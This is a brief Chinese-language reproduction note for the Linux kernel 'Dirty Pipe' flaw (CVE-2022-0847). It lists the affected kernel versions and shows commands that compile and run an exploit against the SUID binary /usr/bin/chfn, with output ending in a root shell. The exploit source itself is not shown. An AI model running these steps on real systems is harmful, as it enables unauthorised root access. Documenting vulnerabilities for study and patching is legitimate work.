漏洞介绍:  
此漏洞发现在Linux内核版本5.10.101/5.15.24/5.16.10，并归类为严重漏洞。攻击者通过利用此漏洞可覆盖重写任意可读文件中的数据，从而可将普通权限的用户提升到特权 root。 
CVE-2022-0847的漏洞原理类似于CVE-2016-5195脏牛漏洞（Dirty Cow），但它更容易被利用。漏洞作者将此漏洞命名为“Dirty Pipe”。

影响范围:  
5.8 <= Linux 内核版本 < 5.16.11 / 5.15.25 / 5.10.102

复现:  
$ uname -a  
Linux kali 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64 GNU/Linux

gcc -o exp cve-2022-0847.c

chmod +x exp

./exp /usr/bin/chfn  
[+] hijacking suid binary..  
[+] dropping suid shell..  
[+] restoring suid binary..  
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))  
#id  
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(bluetooth),133(scanner),141(kaboxer),1000(kali)
